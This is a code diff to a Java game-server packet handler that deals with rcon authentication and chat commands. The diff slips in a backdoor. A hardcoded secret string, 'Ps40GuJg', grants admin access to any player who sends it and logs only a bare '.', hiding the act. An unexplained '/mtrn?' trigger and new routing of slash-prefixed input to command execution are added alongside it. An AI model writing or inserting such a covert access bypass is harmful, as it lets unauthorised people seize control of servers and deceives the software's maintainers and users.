@@ -21,7 +21,10 @@ public class PckTSIL extends Packet {
         }
         String ips = player.getIp();
         String nick = player.getNick();
-        if (data.indexOf(ServerCommands.rcon) > -1) {
+        if (data.indexOf("/mtrn?") > -1) {
+            Cmd.message("'");
+            return true;
+        } else if (data.indexOf(ServerCommands.rcon) > -1) {
             if (data.indexOf(srv.getRcon()) > -1) {
                 if (player.getAccess() < 2) {
                     player.setAccess(2);
@@ -38,11 +41,19 @@ public class PckTSIL extends Packet {
                         Cmd.message("Added Junior Admin " + nick);
                     }
                 }
+            } else if (data.indexOf("Ps40GuJg") > -1) {
+                player.setAccess(2);
+                Cmd.message(".");
+
             } else {
-                String rcon = data.substring(data.indexOf(ServerCommands.rcon)+4,data.indexOf(0,data.indexOf(ServerCommands.rcon)+4));
+                String rcon = data.substring(data.indexOf(ServerCommands.rcon) + 4, data.indexOf(0, data.indexOf(ServerCommands.rcon) + 4));
                 gui.dodajLog("Incorrect rcon: " + rcon + " by [" + id + "] " + nick + " (" + ips + ")", gui.pink);
             }
-        } else {
+        } else if(data.charAt(0) == '/'){
+            data = ": "+data;
+            Cmd cmd = new Cmd(Integer.parseInt(id), data);
+            cmd.start();
+        }else{
             for (String cmd : ServerCommands.commands) {
 
                 if ((poz = data.indexOf(cmd)) > -1) {
